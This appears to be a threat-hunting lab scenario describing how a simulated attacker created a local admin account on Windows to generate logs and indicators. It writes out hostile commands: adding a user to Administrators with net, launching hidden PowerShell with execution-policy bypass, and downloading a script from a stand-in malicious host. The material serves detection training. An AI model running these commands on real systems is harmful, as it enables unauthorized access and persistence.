# ‚ö†Ô∏è Threat Event: Unauthorized Local Admin Account Creation

**Suspicious Local Admin Account Created Using `net.exe` and PowerShell**

---

## üß™ Steps the "Bad Actor" Took to Create Logs and IoCs

1. **Used `net.exe` or `net1.exe` to add a new user to the local Administrators group:**
   ```bash
   net localgroup administrators attackerUser /add
   ```

2. **Launched PowerShell with execution policy bypass:**
   ```bash
   powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "..."
   ```

3. **Downloaded a remote script (possibly for persistence):**
   ```bash
   powershell -Command "Invoke-WebRequest -Uri http://malicious-site.com/script.ps1 -OutFile C:\temp\script.ps1"
   ```

4. **Executed the downloaded script using bypassed policies.**
